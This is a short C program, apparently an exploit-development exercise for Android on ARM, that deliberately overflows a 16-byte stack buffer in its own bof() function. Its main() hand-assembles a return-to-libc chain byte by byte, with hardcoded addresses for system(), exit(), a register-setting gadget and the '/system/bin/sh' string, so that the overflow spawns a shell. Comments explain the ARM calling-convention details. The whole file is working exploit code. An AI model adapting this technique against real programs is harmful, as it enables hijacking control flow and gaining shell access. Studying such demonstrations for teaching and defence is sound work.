#include <stdio.h>
#include <stdlib.h>

void bof(char *arg)
{
	char buffer[16];
	memcpy(buffer, arg, 40);
}

int main()
{
	char sh_str[] = "/system/bin/sh";
	char buf[40];
	
	printf("/system/bin/sh is at %p\n", sh_str);	

	/* set_regs's stack : start 
	   NOTE The address of exit() is 0xf7730724. According to AAPCS, 
	   we need to add 1 to the address. The same applies to system()
	 */
	/// return address for system(), which is exit() and poped into lr
	buf[39] = 0xf7;
	buf[38] = 0x73;
	buf[37] = 0x07;
	buf[36] = 0x25;
	/// bp for system(), which is popped into r11
	/// NOTE bp can be any valid address in current program 
	buf[35] = 0xff;
	buf[34] = 0xfe;
	buf[33] = 0xf8;
	buf[32] = 0x8c;
	/// addr of system(), which is popped into r1	
	buf[31] = 0xf7;
	buf[30] = 0x75;
	buf[29] = 0x91;
	buf[28] = 0xa5;
	/// addr of "/system/bin/sh", which is popped into r0 
	buf[27] = 0xff;
	buf[26] = 0xfe;
	buf[25] = 0xf8;
	buf[24] = 0x40;
	/* set_regs's stack : end */
	
	/* bof's stack : start */
	/// lr: bof's return address, which is set_regs()  
	buf[23] = 0xaa;
	buf[22] = 0xaa;
	buf[21] = 0xa3;
	buf[20] = 0x98;
	/// bp for set_regs()
	/// NOTE bp can be any valid address in current program 
	buf[19] = 0xff;
	buf[18] = 0xfe;
	buf[17] = 0xf8;
	buf[16] = 0x8c;
	/* bof's stack : end */
	
	bof(buf);

	return 0;
}

